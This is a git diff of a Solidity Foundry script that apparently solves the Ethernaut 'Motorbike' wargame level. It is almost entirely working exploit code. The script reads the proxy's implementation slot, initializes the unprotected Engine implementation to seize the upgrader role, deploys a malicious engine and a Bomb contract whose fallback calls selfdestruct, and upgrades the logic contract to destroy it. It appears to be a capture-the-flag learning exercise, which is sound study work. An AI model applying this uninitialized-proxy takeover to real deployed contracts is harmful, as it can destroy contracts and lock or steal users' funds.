@@ -2,48 +2,67 @@
 pragma solidity <0.7.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import { Motorbike, Engine } from "../src/Motorbike.sol";
+import { Motorbike, Engine, myMaliciousEngine } from "../src/Motorbike.sol";
 
 contract Bomb {
+
+    constructor () public {}
+
     fallback () external {
-        selfdestruct(address(0));
+        selfdestruct(msg.sender);
     }
+
 }
 
 contract MotorbikeSolver is Script {
-	
-	// Motorbike public instance = Motorbike(payable(0x4515021B8232Abe3323E48D9537D54337D549b68));
-	// Engine public engine = Engine(0x5b6c89e2af705d51D6d164b46107204046173964);
 
-	Engine public engine = new Engine();
-	Motorbike public instance = new Motorbike(address(engine));
+    // Motorbike public instance = Motorbike(0xc4247B4b2F26DF92854BE78aE362289C75c92fd2);
+    Motorbike public instance = new Motorbike(address(new Engine()));
+
+    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
 	uint256 prv = vm.envUint("PRV");
-
 	address me = vm.envAddress("PUB");
 
-	function run () external {
+    function run() external {
+        
+        vm.startBroadcast(prv);
+        
+        bytes32 engineAddress = vm.load(address(instance), IMPLEMENTATION_SLOT);
+        console.logBytes32(engineAddress);
 
-		vm.startBroadcast(prv);
-
-        bytes32 data = vm.load(address(instance), bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
-        address engineAddress = address(uint160(uint256(data)));
-        console.log(engineAddress);
-        // address of engine
-
+        Engine engine = Engine(address(uint160(uint256(engineAddress))));
+        
         console.log(engine.upgrader());
-
+        
         engine.initialize();
-        address(instance).call{value: 1 wei}("nnnnnnnn all");
-        // Bomb bomb = new Bomb();
-        // engine.upgradeToAndCall(address(bomb), "doesntexist");
+        console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
+
+        
+        Bomb bomb = new Bomb();
+        myMaliciousEngine myEngine = new myMaliciousEngine();
+        engine.upgradeToAndCall(
+            address(myEngine),
+            ""
+        );
+
+
+        myEngine.initialize(address(instance));
+
+        // engine.upgradeToAndCall(address(myEngine), "");
+
+        // console.log(myEngine.upgrader());
+        address(instance).call(abi.encodeWithSelector(myEngine.upgradeToAndCall.selector, address(bomb), ""));
+
+        console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
+
+
 
         console.log(engine.upgrader());
 
+        vm.stopBroadcast();
 
-		vm.stopBroadcast();
-
-
-	}
+    }
 
 }
+
